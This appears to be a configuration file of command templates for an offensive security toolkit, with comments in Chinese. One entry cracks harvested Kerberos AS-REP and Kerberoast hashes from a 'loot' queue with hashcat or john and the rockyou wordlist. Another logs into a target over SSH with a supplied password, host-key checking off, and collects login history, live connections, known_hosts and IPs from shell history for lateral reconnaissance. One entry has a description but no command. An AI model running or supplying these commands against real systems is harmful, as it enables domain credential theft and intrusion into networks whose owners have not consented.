tools.name: 破解队列一把跑
tools.desc: 项目 hashqueue.txt 按 asrep/tgs 前缀自动分流双模式;无 GPU 自动走 john
tools.cmd: Q=${PROJ_DIR:-$HOME/tools/loot}/hashqueue.txt; [ -f "$Q" ] || { echo '队列空(先跑收割类工具)'; exit 1; }; grep -F '$krb5asrep' "$Q" | sort -u > /tmp/asq.txt; grep -F '$krb5tgs' "$Q" | grep -F '$krb5tgs$23$' | sort -u > /tmp/tgq.txt; echo '== AS-REP('$(wc -l < /tmp/asq.txt)'条) =='; [ -s /tmp/asq.txt ] && hashcat -m 18200 /tmp/asq.txt /usr/share/wordlists/rockyou.txt -O --show | head; [ -s /tmp/asq.txt ] && hashcat -m 18200 /tmp/asq.txt /usr/share/wordlists/rockyou.txt -O --force; echo '== Kerberoast RC4('$(wc -l < /tmp/tgq.txt)'条) =='; [ -s /tmp/tgq.txt ] && hashcat -m 13100 /tmp/tgq.txt /usr/share/wordlists/rockyou.txt -O --show | head; [ -s /tmp/tgq.txt ] && hashcat -m 13100 /tmp/tgq.txt /usr/share/wordlists/rockyou.txt -O --force; if ! hashcat -I >/dev/null 2>&1; then echo '[!] hashcat 无计算后端(VM 无 GPU/OpenCL)→ john CPU 兜底'; [ -s /tmp/asq.txt ] && john --format=krb5asrep --wordlist=/usr/share/wordlists/rockyou.txt /tmp/asq.txt; [ -s /tmp/tgq.txt ] && john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt /tmp/tgq.txt; fi

tools.desc: 谁连过来(netstat/net sessions)+连过谁(RDP注册表历史)+ARP,WMI 远程一键

tools.name: Linux 连接溯源
tools.desc: last/lastb 来源IP+ss 当前+known_hosts/bash_history 连过谁+ARP
tools.cmd: sshpass -p {{pass}} ssh -o StrictHostKeyChecking=no -o ConnectTimeout=8 {{user}}@{{target}} 'echo ==谁连过来(last)==; last -F -a | head -20; echo ==谁连过来(失败)==; lastb -a 2>/dev/null | head -10; echo ==当前连接==; ss -tnp 2>/dev/null | head -20; echo ==连过哪些IP(known_hosts)==; cat ~/.ssh/known_hosts 2>/dev/null | awk '\''{print $1}'\'' | sort -u; echo ==连过哪些IP(history里的ssh)==; grep -hE '\''ssh|scp'\'' ~/.bash_history ~/.zsh_history 2>/dev/null | grep -oE '\''[0-9]{1,3}(\.[0-9]{1,3}){3}'\'' | sort -u; echo ==ARP==; ip neigh 2>/dev/null | head -10'
